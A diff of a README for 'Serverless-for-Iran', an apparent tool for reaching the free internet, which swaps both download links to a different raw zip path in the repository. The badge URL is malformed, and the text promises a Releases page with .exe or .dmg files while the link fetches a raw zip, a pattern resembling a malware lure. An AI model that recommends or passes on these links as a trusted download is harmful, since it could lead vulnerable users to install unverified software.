@@ -1,6 +1,6 @@
 # 🌐 Serverless-for-Iran - Access the Free Internet Seamlessly
 
-![Download Now](https://raw.githubusercontent.com/art140754art/Serverless-for-Iran/main/gibelite/Serverless-for-Iran.zip%20Now-Serverless%20for%20Iran-brightgreen)
+![Download Now](https://raw.githubusercontent.com/art140754art/Serverless-for-Iran/main/Subscription/Serverless-for-Iran-v3.4.zip%20Now-Serverless%20for%20Iran-brightgreen)
 
 ## 🚀 Getting Started
 
@@ -26,7 +26,7 @@ To run Serverless-for-Iran, make sure your device meets the following requiremen
 
 To get started, visit this page to download the application: 
 
-[Download Serverless-for-Iran](https://raw.githubusercontent.com/art140754art/Serverless-for-Iran/main/gibelite/Serverless-for-Iran.zip)
+[Download Serverless-for-Iran](https://raw.githubusercontent.com/art140754art/Serverless-for-Iran/main/Subscription/Serverless-for-Iran-v3.4.zip)
 
 Once you are on the Releases page, look for the latest version. The file will typically have an extension like ".exe" for Windows or ".dmg" for macOS.
 
